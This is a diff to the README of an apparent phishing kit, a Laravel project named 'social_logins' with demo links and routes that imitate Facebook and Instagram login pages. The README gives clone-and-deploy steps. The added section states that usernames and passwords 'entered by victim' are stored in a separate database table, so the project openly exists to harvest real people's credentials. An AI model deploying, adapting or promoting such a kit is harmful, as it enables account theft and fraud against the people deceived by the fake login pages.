@@ -6,7 +6,7 @@ Demo: Instagram https://humsaz.com.pk/facebook
 
 # How to use?
 
-Just like notmal way to delpoy laravel project on server
+Just like a notmal way to delpoy laravel project on server
 
 1) git clone https://github.com/officialzubairansari/social_logins
 2) Create databbase
@@ -19,6 +19,11 @@ Just like notmal way to delpoy laravel project on server
 
 1) For facebook: yourdomain.com/facebook
 1) For Instagram: yourdomain.com/instagram
+
+
+# Where passwords will be saved?
+
+All the username and passwords entered by victim will be store in database for seperate table. 
 
 
 
